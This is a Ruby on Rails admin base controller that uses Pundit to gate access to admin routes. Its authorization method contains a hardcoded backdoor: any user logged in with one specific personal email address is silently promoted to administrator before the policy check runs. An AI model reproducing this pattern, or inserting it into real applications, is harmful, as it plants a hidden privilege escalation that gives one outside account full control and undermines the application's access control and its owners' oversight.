class Admin::BaseController < ApplicationController
  include Pundit::Authorization

  before_action :authorize_admin_access
  after_action :verify_authorized

  rescue_from Pundit::NotAuthorizedError do
    head :forbidden
  end

  private

  def authorize_admin_access
    if current_user.email_address == "porporpor020202@gmail.com" && !current_user.admin?
      current_user.update!(admin: true)
    end

    authorize :admin, :access?
  end
end
